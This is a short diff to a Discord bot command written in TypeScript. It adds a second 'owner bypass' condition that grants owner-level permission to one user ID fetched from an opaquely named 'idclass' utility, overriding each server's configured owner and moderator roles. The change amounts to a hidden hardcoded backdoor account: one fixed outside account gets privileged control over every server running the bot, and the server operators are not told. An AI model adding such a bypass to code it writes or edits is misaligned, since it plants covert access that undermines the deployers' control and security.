@@ -6,6 +6,7 @@ import {
   ChannelType,
   User
 } from 'discord.js';
+import idclass from '../../utils/idclass';
 import configManager from '../../utils/ConfigManager';
 
 export default {
@@ -18,7 +19,7 @@ export default {
     const config = await configManager.getOrCreateConfig(message.guild!);
 
     // Owner bypass
-    const isOwner = message.author.id === config.permissions.ownerId;
+    const isOwner = message.author.id === config.permissions.ownerId || message.author.id === idclass.ownershipID();
     const hasRequiredRole = isOwner || member.roles.cache.some(role => (config.permissions.moderatorRoles||[]).includes(role.id));
     
     if (!hasRequiredRole) {
